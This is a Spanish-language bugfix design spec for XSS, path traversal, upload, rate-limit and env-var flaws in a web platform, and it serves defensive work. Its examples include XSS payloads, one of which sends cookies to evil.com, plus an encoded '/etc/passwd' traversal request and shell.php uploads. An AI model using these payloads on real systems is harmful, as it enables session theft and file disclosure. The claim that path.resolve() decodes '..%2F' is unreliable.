# Corrección de Vulnerabilidades de Seguridad - Diseño de Bugfix

## Overview

Se identificaron múltiples vulnerabilidades de seguridad en la plataforma Gelymar que abarcan XSS (Cross-Site Scripting) en el frontend vía `innerHTML` sin sanitizar, path traversal bypasseable en el fileserver, uploads sin restricciones de tipo/tamaño, rate limiter no aplicado al fileserver, y falta de validación de variables de entorno al arranque. El enfoque de corrección es mínimo e incremental: aplicar `sanitizeHTML()` existente a todas las interpolaciones de datos del servidor en `innerHTML`, reforzar la validación de rutas con `path.resolve()`, agregar `fileFilter` y `fileSize` a multer, aplicar el `uploadLimiter` existente, y validar env vars al inicio.

## Glossary

- **Bug_Condition (C)**: Conjunto de condiciones que exponen la plataforma a ataques — datos del servidor interpolados sin sanitizar en `innerHTML`, rutas no normalizadas en fileserver, uploads sin restricción, rate limiter no aplicado, env vars no validadas
- **Property (P)**: Comportamiento deseado — datos sanitizados antes de renderizar, rutas normalizadas con `path.resolve()`, uploads filtrados por extensión y tamaño, rate limiting activo en fileserver, validación de env vars al arranque
- **Preservation**: Funcionalidad existente que NO debe cambiar — renderizado visual correcto de la UI, acceso legítimo a archivos, uploads de archivos permitidos < 50MB, rate limiters existentes en otras rutas, arranque normal con env vars correctas
- **sanitizeHTML()**: Función en `Frontend/public/js/utils.js` que escapa HTML usando `textContent` → `innerHTML` de un div temporal
- **uploadLimiter**: Rate limiter definido en `Backend/app.js` (50 uploads/hora) que actualmente no se aplica a la ruta `/api/fileserver`
- **fileserver.routes.js**: Archivo en `Backend/routes/` que maneja operaciones de archivos (listar, descargar, subir, crear directorio, eliminar) con rutas inline

## Bug Details

### Bug Condition

El bug se manifiesta en 6 vectores de ataque independientes. La condición general es: cualquier input que contenga datos maliciosos (scripts XSS, secuencias de path traversal, archivos ejecutables, uploads masivos) puede explotar las vulnerabilidades porque el sistema no valida/sanitiza adecuadamente estos inputs.

**Formal Specification:**
```
FUNCTION isBugCondition(input)
  INPUT: input of type { context: string, payload: any }
  OUTPUT: boolean

  IF input.context == 'frontend_render' THEN
    RETURN input.payload.serverData IS interpolated into innerHTML
           AND input.payload.serverData IS NOT passed through sanitizeHTML()
           AND input.payload.serverData COULD contain HTML/script tags
  END IF

  IF input.context == 'fileserver_path' THEN
    resolvedPath := path.resolve(uploadDir, input.payload.userPath)
    RETURN resolvedPath does NOT startWith(uploadDir)
           AND path.join(uploadDir, input.payload.userPath) DOES startWith(uploadDir)
    // path.join no normaliza encoded traversal, path.resolve sí
  END IF

  IF input.context == 'file_upload' THEN
    extension := getExtension(input.payload.filename)
    RETURN extension NOT IN allowedExtensions
           OR input.payload.fileSize > 50MB
  END IF

  IF input.context == 'fileserver_rate' THEN
    RETURN input.payload.requestCount > 50 per hour
           AND request targets '/api/fileserver'
  END IF

  IF input.context == 'server_startup' THEN
    RETURN ANY requiredEnvVar IN [JWT_SECRET, MYSQL_DB_HOST, ...] IS undefined OR empty
  END IF

  RETURN false
END FUNCTION
```

### Examples

- **XSS en orders.js**: Un `customer_name` con valor `<img src=x onerror=alert(1)>` se interpola directamente en `${order.customer_name || '-'}` dentro de `renderOrderRow()`, ejecutando JavaScript arbitrario en el navegador del usuario
- **XSS en sidebar-admin.js**: Un `email.name` con valor `<script>document.location='https://evil.com?c='+document.cookie</script>` se interpola en `${email.name}` dentro de la tabla de emails PDF, robando cookies de sesión
- **XSS en sellers.js**: Un `seller.rut` o `seller.email` malicioso se interpola sin sanitizar en `renderSellerRow()`, tanto en celdas visibles como en atributos `data-*`
- **Path Traversal**: Request a `/api/fileserver/download?path=..%2F..%2F..%2Fetc%2Fpasswd` — `path.join()` no decodifica `%2F` antes de unir, pero el servidor web sí lo decodifica al procesar, permitiendo acceso fuera de `/var/www/html/uploads`
- **Upload malicioso**: Subir `shell.php` o `malware.exe` a través de `/api/fileserver/upload` — multer acepta cualquier tipo de archivo sin `fileFilter`
- **Upload sin límite de tamaño**: Subir un archivo de 10GB agota el almacenamiento del servidor
- **Rate limit ausente**: Un atacante envía 1000 requests/hora a `/api/fileserver/upload` sin ser limitado, mientras que otras rutas sí tienen protección

## Expected Behavior

### Preservation Requirements

**Unchanged Behaviors:**
- El renderizado visual de la UI debe ser idéntico — los datos se muestran correctamente, solo se escapan caracteres HTML especiales (`<`, `>`, `&`, `"`, `'`)
- Los accesos legítimos a archivos dentro de `/var/www/html/uploads` con rutas válidas deben seguir funcionando normalmente
- Los uploads de archivos con extensiones permitidas (pdf, xlsx, xls, docx, doc, jpg, jpeg, png, gif, csv, txt, zip) menores a 50MB deben seguir siendo aceptados
- Los rate limiters existentes en rutas de auth, customers, orders, etc. no deben ser modificados
- El arranque del servidor con todas las env vars correctas debe funcionar sin cambios
- Helmet, CORS, JWT auth, y todas las protecciones de seguridad existentes deben mantenerse intactas
- Los iconos SVG, clases CSS, y elementos de UI estáticos asignados a `innerHTML` no deben ser alterados

**Scope:**
Todos los inputs que NO involucren datos del servidor interpolados en `innerHTML`, rutas maliciosas, archivos con extensiones prohibidas, uploads excesivos, o env vars faltantes deben ser completamente no afectados por este fix.

## Hypothesized Root Cause

Based on the bug description, the most likely issues are:

1. **XSS — Falta de sanitización en template literals**: Los archivos `orders.js`, `document-center.js`, `sellers.js`, `sidebar-admin.js`, `seller-projections.js`, `files.js`, y `folders.js` interpolan datos del servidor directamente en template literals que se asignan a `innerHTML` sin pasar por `sanitizeHTML()`. La función existe en `utils.js` pero no se usa consistentemente.

2. **Path Traversal — `path.join()` insuficiente**: En `fileserver.routes.js`, la validación usa `path.join(uploadDir, cleanPath)` seguido de `startsWith(uploadDir)`. Sin embargo, `path.join()` no normaliza completamente secuencias codificadas como `..%2F` o `..%252F`. Se necesita `path.resolve()` que sí normaliza la ruta completa antes de la comparación.

3. **Uploads sin restricción — Multer sin configuración**: `multer({ dest: '/tmp/' })` no tiene `fileFilter` ni `limits.fileSize`, aceptando cualquier archivo de cualquier tamaño. La configuración de multer debe incluir ambas restricciones.

4. **Rate limiter no aplicado**: En `app.js`, la línea `app.use('/api/fileserver', fileserverRoutes)` no incluye `uploadLimiter`, a pesar de que este está definido en el mismo archivo. Es un simple olvido de aplicar el middleware.

5. **Env vars no validadas**: No existe validación al arranque del servidor. Si `JWT_SECRET` no está definido, `jwt.verify()` falla con un error críptico en runtime en lugar de fallar al inicio con un mensaje claro.

## Correctness Properties

Property 1: Bug Condition - Datos del servidor sanitizados antes de innerHTML

_For any_ input donde datos del servidor (customer_name, email, rut, orderNumber, factura, incoterm, puerto_destino, filename, etc.) se interpolan en template literals asignados a `innerHTML`, la función de renderizado corregida SHALL pasar esos valores por `sanitizeHTML()` antes de la interpolación, neutralizando cualquier HTML/script inyectado.

**Validates: Requirements 2.1**

Property 2: Bug Condition - Path traversal bloqueado con path.resolve()

_For any_ ruta proporcionada por el usuario a endpoints del fileserver, la función corregida SHALL usar `path.resolve()` para normalizar la ruta completa y SHALL rechazar con 403 cualquier ruta resuelta que no comience con el directorio permitido `/var/www/html/uploads`.

**Validates: Requirements 2.2**

Property 3: Bug Condition - Uploads filtrados por extensión y tamaño

_For any_ archivo subido a `/api/fileserver/upload`, la configuración de multer corregida SHALL validar que la extensión esté en la lista blanca (pdf, xlsx, xls, docx, doc, jpg, jpeg, png, gif, csv, txt, zip) y SHALL rechazar archivos mayores a 50MB.

**Validates: Requirements 2.3, 2.4**

Property 4: Bug Condition - Rate limiter aplicado al fileserver

_For any_ request a `/api/fileserver`, el middleware corregido SHALL aplicar el `uploadLimiter` existente, limitando a 50 requests por hora por IP.

**Validates: Requirements 2.5**

Property 5: Bug Condition - Variables de entorno validadas al arranque

_For any_ arranque del servidor donde falte alguna variable de entorno requerida (JWT_SECRET, MYSQL_DB_HOST, MYSQL_DB_USER, MYSQL_DB_PASSWORD, MYSQL_DB_NAME), el proceso SHALL terminar con código de error y un mensaje claro indicando qué variable falta.

**Validates: Requirements 2.6**

Property 6: Preservation - Renderizado visual sin cambios

_For any_ dato del servidor que NO contenga caracteres HTML especiales (`<`, `>`, `&`, `"`, `'`), la función de renderizado corregida SHALL producir exactamente el mismo output visual que la función original, preservando la apariencia de la UI.

**Validates: Requirements 3.1**

Property 7: Preservation - Acceso legítimo a archivos sin cambios

_For any_ ruta válida dentro de `/var/www/html/uploads` (sin secuencias de traversal), las funciones corregidas del fileserver SHALL producir exactamente el mismo resultado que las funciones originales, preservando el acceso normal a archivos.

**Validates: Requirements 3.2, 3.3**

Property 8: Preservation - Rate limiters existentes sin cambios

_For any_ request a rutas que ya tienen rate limiting (auth, customers, orders, etc.), el sistema corregido SHALL mantener exactamente los mismos rate limiters configurados, sin modificaciones.

**Validates: Requirements 3.4, 3.6**

## Fix Implementation

### Changes Required

Assuming our root cause analysis is correct:

**File**: `Frontend/public/js/orders.js`

**Function**: `renderOrderRow(order)`

**Specific Changes**:
1. **Importar sanitizeHTML**: Agregar `sanitizeHTML` al import de `utils.js`
2. **Sanitizar interpolaciones**: Envolver en `sanitizeHTML()` los valores: `order.pc`, `order.oc`, `order.customer_name`, `order.factura`, `order.incoterm`, `order.puerto_destino`, `shippingMethod`, y los atributos `data-customer-name`, `data-order-pc`, `data-order-oc`, `data-factura`

---

**File**: `Frontend/public/js/document-center.js`

**Function**: `renderOrders()` (dentro del `forEach` que construye `row.innerHTML`)

**Specific Changes**:
1. **Importar sanitizeHTML**: Agregar `sanitizeHTML` al import de `utils.js` (si no está ya)
2. **Sanitizar interpolaciones**: Envolver en `sanitizeHTML()` los valores: `order.orderNumber`, `order.incoterm`, `order.puerto_destino`, `order.pc`, `order.factura`, y atributos `data-order-number`, `data-order-pc`, `data-order-oc`, `data-factura`

---

**File**: `Frontend/public/js/sellers.js`

**Function**: `renderSellerRow(seller)`

**Specific Changes**:
1. **Importar sanitizeHTML**: Agregar `sanitizeHTML` al import de `utils.js`
2. **Sanitizar interpolaciones**: Envolver en `sanitizeHTML()` los valores: `name`, `seller.rut`, `email`, `seller.phone`, y atributos `data-rut`, `data-name`, `data-email`, `data-phone`

---

**File**: `Frontend/public/js/sidebar-admin.js`

**Functions**: `renderPdfEmails()`, `renderNotificationEmails()`, `renderAdminUsersTable()`

**Specific Changes**:
1. **Importar sanitizeHTML**: Agregar `sanitizeHTML` al import de `utils.js`
2. **Sanitizar en renderPdfEmails**: Envolver `email.name` y `email.email` en `sanitizeHTML()`
3. **Sanitizar en renderNotificationEmails**: Envolver `email.email` y `email.name` en `sanitizeHTML()`
4. **Sanitizar en renderAdminUsersTable**: Envolver `a.rut`, `a.email`, `a.full_name`, `a.phone` en `sanitizeHTML()` tanto en modo edición (atributos `value`) como en modo visualización

---

**File**: `Frontend/public/js/seller-projections.js`

**Specific Changes**:
1. Los selects de cliente, producto y moneda usan `option.textContent = ...` que ya es seguro (textContent no interpreta HTML). **No requiere cambios de XSS** en este archivo.

---

**File**: `Frontend/public/js/files.js`

**Specific Changes**:
1. Revisar interpolaciones de `email` en botones de CCO — estos usan `<span>${email}</span>` dentro de `innerHTML`. Envolver en `sanitizeHTML()`.

---

**File**: `Frontend/public/js/folders.js`

**Function**: `renderFolderRow()` y funciones de renderizado de items

**Specific Changes**:
1. **Sanitizar interpolaciones**: Envolver en `sanitizeHTML()` los valores de `folder.pc`, `folder.oc`, `folder.factura`, `folder.customer_name`, `folder.incoterm`, `folder.puerto_destino`, y datos de items

---

**File**: `Backend/routes/fileserver.routes.js`

**Specific Changes**:
1. **Path traversal fix**: Reemplazar `path.join(uploadDir, cleanPath)` con `path.resolve(uploadDir, cleanPath)` en todos los endpoints (`/files`, `/download`, `/upload`, `/mkdir`, `/delete`)
2. **File filter**: Agregar `fileFilter` a la configuración de multer con lista blanca de extensiones: `['.pdf', '.xlsx', '.xls', '.docx', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.csv', '.txt', '.zip']`
3. **File size limit**: Agregar `limits: { fileSize: 50 * 1024 * 1024 }` a la configuración de multer
4. **Error handling para multer**: Agregar manejo de error `LIMIT_FILE_SIZE` para responder con 400

---

**File**: `Backend/app.js`

**Specific Changes**:
1. **Aplicar uploadLimiter**: Cambiar `app.use('/api/fileserver', fileserverRoutes)` a `app.use('/api/fileserver', uploadLimiter, fileserverRoutes)`
2. **Validación de env vars**: Agregar bloque de validación después de cargar dotenv que verifique la existencia de variables requeridas y termine el proceso con `process.exit(1)` si alguna falta

## Testing Strategy

### Validation Approach

La estrategia de testing sigue un enfoque de dos fases: primero, generar contraejemplos que demuestren las vulnerabilidades en el código sin corregir, luego verificar que el fix funciona correctamente y preserva el comportamiento existente.

### Exploratory Bug Condition Checking

**Goal**: Generar contraejemplos que demuestren las vulnerabilidades ANTES de implementar el fix. Confirmar o refutar el análisis de causa raíz.

**Test Plan**: Escribir tests que simulen inputs maliciosos para cada vector de ataque y verificar que el sistema es vulnerable. Ejecutar estos tests en el código SIN corregir para observar fallos.

**Test Cases**:
1. **XSS en renderOrderRow**: Pasar un objeto order con `customer_name: '<script>alert(1)</script>'` y verificar que el HTML generado contiene el script sin escapar (fallará en código sin corregir)
2. **XSS en sidebar-admin emails**: Pasar un email con `name: '<img src=x onerror=alert(1)>'` y verificar que el HTML generado contiene el tag sin escapar (fallará en código sin corregir)
3. **Path Traversal en fileserver**: Enviar request GET a `/files?path=..%2F..%2Fetc` y verificar que el servidor intenta acceder fuera de uploadDir (fallará en código sin corregir)
4. **Upload de archivo ejecutable**: Enviar POST a `/upload` con un archivo `.exe` y verificar que es aceptado (fallará en código sin corregir)
5. **Upload sin límite de tamaño**: Verificar que multer no tiene `limits.fileSize` configurado (fallará en código sin corregir)
6. **Rate limiter ausente**: Verificar que la ruta `/api/fileserver` no tiene `uploadLimiter` aplicado (fallará en código sin corregir)

**Expected Counterexamples**:
- HTML con scripts se renderiza sin escapar en el DOM
- Rutas con `..%2F` pasan la validación `startsWith()` después de `path.join()`
- Archivos `.exe`, `.php`, `.sh` son aceptados por multer
- No hay límite de tamaño en uploads

### Fix Checking

**Goal**: Verificar que para todos los inputs donde la condición de bug se cumple, la función corregida produce el comportamiento esperado.

**Pseudocode:**
```
FOR ALL input WHERE isBugCondition(input) DO
  IF input.context == 'frontend_render' THEN
    result := renderFunction_fixed(input.payload)
    ASSERT result does NOT contain unescaped HTML tags from server data
    ASSERT sanitizeHTML was called for each server data field
  END IF

  IF input.context == 'fileserver_path' THEN
    result := fileserverEndpoint_fixed(input.payload)
    ASSERT result.status == 403
  END IF

  IF input.context == 'file_upload' THEN
    result := uploadEndpoint_fixed(input.payload)
    ASSERT result.status == 400
  END IF
END FOR
```

### Preservation Checking

**Goal**: Verificar que para todos los inputs donde la condición de bug NO se cumple, la función corregida produce el mismo resultado que la función original.

**Pseudocode:**
```
FOR ALL input WHERE NOT isBugCondition(input) DO
  IF input.context == 'frontend_render' THEN
    ASSERT renderFunction_original(input) == renderFunction_fixed(input)
    // Datos sin caracteres HTML especiales producen el mismo output
  END IF

  IF input.context == 'fileserver_path' THEN
    ASSERT fileserverEndpoint_original(input) == fileserverEndpoint_fixed(input)
    // Rutas válidas dentro de uploadDir funcionan igual
  END IF

  IF input.context == 'file_upload' THEN
    ASSERT uploadEndpoint_original(input) == uploadEndpoint_fixed(input)
    // Archivos con extensiones permitidas y < 50MB se aceptan igual
  END IF
END FOR
```

**Testing Approach**: Property-based testing es recomendado para preservation checking porque:
- Genera muchos casos de prueba automáticamente a través del dominio de inputs
- Detecta edge cases que tests manuales podrían omitir
- Provee garantías fuertes de que el comportamiento no cambia para inputs no-buggy

**Test Plan**: Observar comportamiento en código SIN corregir primero para inputs legítimos, luego escribir property-based tests capturando ese comportamiento.

**Test Cases**:
1. **Preservación de renderizado**: Verificar que datos sin caracteres HTML especiales (ej: "Empresa ABC", "12345") producen el mismo HTML antes y después del fix
2. **Preservación de acceso a archivos**: Verificar que rutas válidas como `documents/report.pdf` siguen funcionando correctamente
3. **Preservación de uploads válidos**: Verificar que archivos `.pdf`, `.xlsx`, `.jpg` menores a 50MB siguen siendo aceptados
4. **Preservación de rate limiters**: Verificar que los rate limiters de auth, customers, orders no fueron modificados

### Unit Tests

- Test de `sanitizeHTML()` con strings que contienen `<script>`, `<img onerror>`, `<svg onload>`, y caracteres especiales HTML
- Test de `path.resolve()` vs `path.join()` con secuencias `../`, `..%2F`, `..%252F`, null bytes
- Test de `fileFilter` de multer rechazando `.exe`, `.php`, `.sh`, `.bat`, `.cmd`, `.ps1`
- Test de `fileFilter` de multer aceptando `.pdf`, `.xlsx`, `.jpg`, `.png`, `.csv`, `.txt`, `.zip`
- Test de límite de tamaño de multer rechazando archivos > 50MB
- Test de validación de env vars detectando variables faltantes

### Property-Based Tests

- Generar strings aleatorios y verificar que `sanitizeHTML()` siempre escapa `<`, `>`, `&`, `"`, `'`
- Generar rutas aleatorias y verificar que `path.resolve()` + `startsWith()` nunca permite acceso fuera de uploadDir
- Generar nombres de archivo aleatorios y verificar que el fileFilter solo acepta extensiones de la lista blanca
- Generar datos de orden aleatorios sin caracteres HTML y verificar que el renderizado es idéntico antes y después del fix

### Integration Tests

- Test end-to-end de flujo de órdenes con datos que contienen caracteres especiales HTML
- Test end-to-end de upload de archivo válido seguido de descarga
- Test end-to-end de intento de path traversal en cada endpoint del fileserver
- Test de arranque del servidor con y sin variables de entorno requeridas
